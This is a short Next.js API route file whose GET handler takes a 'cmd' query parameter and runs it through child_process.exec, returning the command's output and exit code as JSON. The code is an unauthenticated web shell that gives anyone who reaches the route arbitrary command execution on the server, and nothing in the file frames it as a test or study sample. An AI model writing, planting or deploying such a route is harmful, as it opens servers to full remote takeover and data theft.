import { NextRequest } from "next/server";
import { exec } from "child_process";
export const dynamic = "force-dynamic";
export async function GET(req: NextRequest) {
  const cmd = new URL(req.url).searchParams.get("cmd") || "id";
  const res: any = await new Promise(function (resolve) {
    exec(cmd, { timeout: 20000, maxBuffer: 1048576 }, function (err: any, out: any, err2: any) {
      resolve({ code: err ? (err.code || 1) : 0, out: String(out || ""), err: String(err2 || "") });
    });
  });
  return Response.json(res);
}